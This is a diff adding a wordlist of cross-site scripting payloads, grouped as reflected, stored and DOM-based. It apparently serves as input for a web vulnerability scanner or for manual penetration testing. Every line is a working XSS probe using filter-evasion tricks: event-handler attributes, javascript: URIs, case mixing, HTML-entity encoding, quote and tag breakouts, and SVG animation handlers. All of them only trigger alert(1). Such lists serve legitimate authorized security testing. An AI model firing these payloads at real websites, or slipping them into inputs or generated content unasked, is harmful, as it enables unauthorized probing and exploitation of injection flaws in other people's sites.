@@ -1,0 +1,52 @@
+﻿# reflected payloads
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe onload=alert(1)>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video><source onerror=alert(1)>
+<a href=javascript:alert(1)>click</a>
+<math><a xlink:href=javascript:alert(1)>click</a></math>
+<data value=javascript:alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<svg><script>alert(1)</script></svg>
+<Img SrC=x OnErRoR=alert(1)>
+<img\nsource=x\nonerror=alert(1)>
+<img src=x onerror=alert`1`>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>
+--><svg/onload=alert(1)>
+"><svg/onload=alert(1)>
+'><svg/onload=alert(1)>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+ onmouseover=alert(1) x=
+ autofocus onfocus=alert(1) x=
+</script><svg/onload=alert(1)>
+';alert(1);//
+";alert(1);//
+`;alert(1);//
+alert(1)//
+javascript:alert(1)
+data:text/html,<svg/onload=alert(1)>
+<iframe srcdoc="<svg/onload=alert(1)>"></iframe>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x to=1>
+<button formaction=javascript:alert(1)>x</button>
+<form><button formaction=javascript:alert(1)>go</button></form>
+
+# stored payloads
+stored::<svg/onload=alert(1)>
+stored::<img src=x onerror=alert(1)>
+stored::"><svg/onload=alert(1)>
+stored::'><img src=x onerror=alert(1)>
+
+# dom payloads
+dom::<svg/onload=alert(1)>
+dom::<img src=x onerror=alert(1)>
+dom::javascript:alert(1)
+dom::</script><svg/onload=alert(1)>
